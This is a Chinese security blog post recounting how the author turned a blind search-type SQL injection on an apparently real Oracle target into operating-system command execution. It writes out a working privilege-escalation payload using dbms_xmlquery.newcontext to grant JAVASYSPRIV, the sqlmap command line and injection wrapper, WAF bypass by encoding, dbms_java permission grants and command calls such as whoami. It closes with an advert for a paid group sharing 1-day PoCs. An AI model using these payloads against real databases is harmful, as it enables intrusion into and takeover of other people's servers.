#  记一次Oracle注入漏洞提权的艰难过程   
 湘安无事   2023-12-02 14:09  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png "")  
##  Part1 前言   
  
**大家好，我是ABC_123**  
。前不久遇到一个Oracle注入漏洞，是搜索型的盲注漏洞，只能用折半法一个字符一个字符的猜解数据，使用sqlmap可以直接跑出来，经过判断是DBA权限。接下来就是想办法通过这个注入点获取操作系统的权限，但是遇到了很多问题，于是搭建环境研究了一天，最后终于获取系统权限，本期ABC_123就把这个案例分享给大家。  
  
**注：本篇文章中的一些说法可能与其它文章不一样，欢迎批评指正。**  
  
##  Part2 技术研究过程   
- ## 加快sqlmap注入过程  
  
由于这个注入点是盲注的，需要通过折半法一个字符字符的猜解，然后又是搜索型的，所以导致注入速度特别慢，所以ABC_123进行了两方面优化，加快sql注入的速度。  
  
**1**  
  在  
**search=%**  
语句中加一个存在结果很少的搜索值，比**search=201922321%**  
，只显示出一条搜索结果，这样减少数据库的检索量和http返回的数据包大小，可以加快sql注入的速度。  
  
如下图所示，**%' And 'sdf' LIKE 'sdf**  
变成**201922321%' And 'sdf' LIKE 'sdf**  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaHPJ50yqP9MII69UsILdUBa2ehpGfhVuibA3Bysricts1m3azrrQ194SA/640?wx_fmt=png "")  
  
  
**2**  
  更改sqlmap的默认10个线程限制。这里需要修改sqlmap的源码，网上有很多教程，这里不过多叙述了。  
  
- ## 改造一下网上的提权语句  
  
网上很多文章给出的Oracle注入提权的语句一般是分为以下3个步骤：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCa3C5hAIvXhZFWcPSVgDxFPPA6TmUlMErFYdBRaCE8n38sLQ0pcQyQpg/640?wx_fmt=png "")  
  
  
这里需要注意看第2步骤，这一步骤就是赋予当前Oracle账号相关的JAVA权限，但是这个语句我一直都不太喜欢用，**因为有大量的单引号存在，然后还有左右尖括号**  
，有时候会被当做XSS攻击payload被转义掉导致注入失败，而且这个语句异常复杂，很容易出错。  
  
这里ABC_123直接用一个简单的语句替代：  
效果比上述语句赋予的权限更多，效果更好。其中需要注意的是，**BEGIN**  
开头，然后**end;**  
结尾，代表一个PL/SQL语句块。  
  
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''grant javasyspriv to test111''; end;') from dual****  
  
- ## Sqlmap的sql-shell功能失败  
  
能用工具还是优先使用工具，于是我用sqlmap的--sql-shell命令将上述语句执行。  
  
sqlmap.py -r 111.txt --dbms=”Oracle” --threads 20 --technique B --batch --sql-shell  
  
将上述三条sql语句执行完毕，发现最后执行命令没有成功：  
  
select LinxRunCMD('whoami') from dual  
  
遇到这种情况，一般两种可能，一种可能是执行命令被拦截了，**另一种可能是Java代码没有执行成功**  
。  
  
于是使用如下sql语句进行判断，  
  
select * from all_objects where object_name like '%LinuxUtil111%'  
  
结果返回0，说明函数没有添加成功。经过后续一系列测试，发现是sqlmap的sql-shell下功能下，上述很复杂的sql语句根本没执行成功。  
  
- ## 开始手工注入  
  
Oracle一般都是支持多语句的，我将SQL注入语句进行了如下修改，通过**and ( 插入sql语句 ) is not null**  
的方式，在左右括号中可以插入各种Oracle的sql语句，这种形式非常方便，这种方式可以方便我们将oracle的各种复杂语句不加修改直接放置进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaRP7sY05yERsLliaU1HBebuFZYLXSJ3tsJs5nxpgzonCibDtibfT0G6KCA/640?wx_fmt=png "")  
  
  
如下图所示，将Oracle提取语句放到左右括号中去执行，  
结果被waf拦截了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaO41ib0tnJqt9PwtUtHFibzr17UxK4ZarFYRlccWgKwgKNYupWzdh7uBQ/640?wx_fmt=png "")  
  
  
于是用Oracle特有的编码方式编码一下，变成如下格式成功执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaSibicjgxe4QUg95NbOeTP2ud77XP7xbdrAGjtSsrOjibTxq8v9yPYlGQg/640?wx_fmt=png "")  
  
  
再次执行查询LinuxUtil111是否存在的sql语句，发现返回count()不为0，说明Java代码成功添加执行。结果  
LinxRunCMD('whoami')  
还是  
执行不了命令，这是为什么呢？  
  
- ## Oracle的java执行权限问题  
  
于是我首先认为是java权限没有添加成功，于是我执行了如下语句：  
  
select granted_role from user_role_privs  
  
发现当前用户有3个权限CONNECT、RESOURCE、JAVASYSPRIV，说明Java相关权限确实是添加成功了，可是为什么就是调用不了LinxRunCMD('whoami')呢？没办法，遇到问题还是搭建环境测试吧。  
在测试环境中，使用navicat将上述oracle提权语句依次执行之后，发现报了权限错误。  
  
java.security.AccessControlException: the Permission (java.io.FilePermission <<ALL FILES>> execute) has not been granted to TEST111. The PL/SQL to grant this is dbms_java.grant_permission( 'TEST111', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' )  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaFDEqnegZnibic0DE2ydwFtTAOtvgRx5Ox47JmMMpibj00IWh8gmtibMIRw/640?wx_fmt=png "")  
  
  
使用如下sql语句  
查询当前Oracle用户的权限，发现是具有JAVASYSPRIV的，但是为啥还是提示没有权限呢？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCagPbBWOBrUr0Aj6SGgLP6hPJU6tkMKyc5EDLcK4n4ybrwWNTcKiag7ZQ/640?wx_fmt=png "")  
  
  
然后ABC_123翻看了大量国外的文章终于发现了问题所在，真正判断当前用户是否有java权限，需要查询session_roles表才行，该表用于用于显示当前会话（session）中的角色信息，必须session_roles中有JAVASYSPRIV权限才行。方法之一就是断开Oracle当前账号的连接，重新连接之后session_roles表中就有相应权限了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaouWSz2rzfAgicNnib8Rh93KT6DQoic8XZNVnZBicyaUT92qkM8cKw7JS0A/640?wx_fmt=png "")  
  
  
在测试环境中，断开重连之后，重新查询session_roles表，发现Java权限成功被添加。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCaXcuxia7dTFDgLvA6TJ032JBiaLIA5guW0gvZhxmaVP5mVqwGMHVXZkIg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCafOYOJmPvvbFsNaHvxVkiaVCm2beg1MdmyN3ibaRbISWzUyu3Xe2LKhEA/640?wx_fmt=png "")  
  
但是我们这里是sql注入点，不可能断开重连，那么有没有办法不断开连接，使java权限立即生效呢？国外文章给出了好几种方法，但是执行之后发现还是不行：  
  
ALTER USER TEST111 DEFAULT ROLE "JAVASYSPRIV";  
  
SET ROLE JAVASYSPRIV;  
  
- ## 最终成功获取系统权限  
  
等到第二天之后，惊奇地发现session_roles中存在JAVASYSPRIV角色了，我也不知道为什么，此时可以通过  
select LinuxExecHanshu('whoami') from dual  
可以执行命令，但是这个时候盲注就是太麻烦了，我们还是结合sqlmap的sql-shell终端来盲注入吧，因为该sql语句比较简短，sqlmap的sql-shell模式猜解是完全无压力的，最终我们成功获取了系统权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CDwJlvz7SqopibvD0e4GfCadDjXuKpnnJZFdfFKnn3WdblF7JzFibVQCU3fMIm1tbJibjbN8dtd0WHg/640?wx_fmt=png "")  
  
  
##  Part3 总结   
  
**1.**  
  这个  
dbms_xmlquery.newcontext  
函数在高版本的Oracle数据库中已经不能提权成功，甚至是不能使用，这时候需要使用其它的方法提权。  
  
**2.**  
  本地搭建的Oracle环境，大多数情况下可以直接提权成功，极少数情况下需要断开重连，具体原因不明。  
  
**3.**  
    
文章中如果有错误，欢迎批评指正。后续会继续分享Oracle提权的其它方法，敬请期待。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
技术交流可加下方wx  
  
****  
****  
**|**  
**知识星球的介绍**  
  
不好意思，兄弟们，这里给湘安无事星球打个广告，不喜欢的可以直接滑走哦。添加下面wx加星球可享优惠  
  
1.群主为什么要建知识星球？  
```
很简单为了恰饭哈哈哈，然后也是为了建立一个圈子进行交流学习和共享资源嘛
相应的也收取费用嘛，毕竟维持星球也需要精力
```  
  
2.知识星球有哪些资源？  
```
群里面联系群主是可以要一些免费的学习资料的，因为群里面大部分是大学生嘛
大学生不就是喜欢白嫖，所以大家会共享一些资料
没有的群主wk也有,wk除了不会pc,其他都能嫖hhh
```  
  
一些实战报告，截的部分  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtODwbOOp88vXJ5mXX9NSIvA7UUtTDHJDhDCOrbSnT7UAsyyTlY1FyJhA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtOWwAWoiaibCM3ibleLWSAKnsLREnwa09BkFZXfm5lRWtfbVwgKf0j3ISaw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtO3qicwjmWdRCB5UxWt1jfnSfKBwD6yIyveRa3ENZ0KXVa9BtRRzD8GicA/640?wx_fmt=png "")  
  
一些1day的poc,这些也就是信息差，不想找可以让wk帮你们嫖,群主也会经常发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtO0QGwS7xuY4vKe6X9SZCa87DMEEJJ68fnBiadQSQTDdfqgVQiaGZz9NbA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtOdSLtwUia1EA2xEubNgTf3UYervduLFz4LWw33ic6fPw7vv1UQyLBEbrQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYtUiaMLiaTbAJqKj9icDvRsVtO4Sq6oGicP66MiaBT1o8YcVKQNLPytG0yB79mVmuXicA2foVBk3Ud5sfvw/640?wx_fmt=png "")  
  
一些共享的资源  
```
1.刀客源码的高级会员
2.FOFA在线查询与下载，key使用、360quake、shodan等
3.专属漏洞库
5.专属内部it免费课程
6.不定期直播分享（星球有录屏）
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/S2ssjS1jNYvS1u1PKCurEmuM61nGSElnNalHCy4YicPa9bZ23vMDPHzQPDxybG50b760tL8KcAYTGjBicGocsdXw/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/S2ssjS1jNYuCJm1WAIhc9XAa6OLI3ryvT32RpoHYTibSMVnsTh875E0Jk4XPduRqDicRQGMWHDD4RnueHudPHI3g/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/S2ssjS1jNYvM6WiaR5ibLImBVXffTWBPcwFRclvucl2KDBy7oCHGic78sP8CjxYf2QtRQNAxgn0BjfaLSH0ruUlCw/640?wx_fmt=jpeg "")  
****  
  
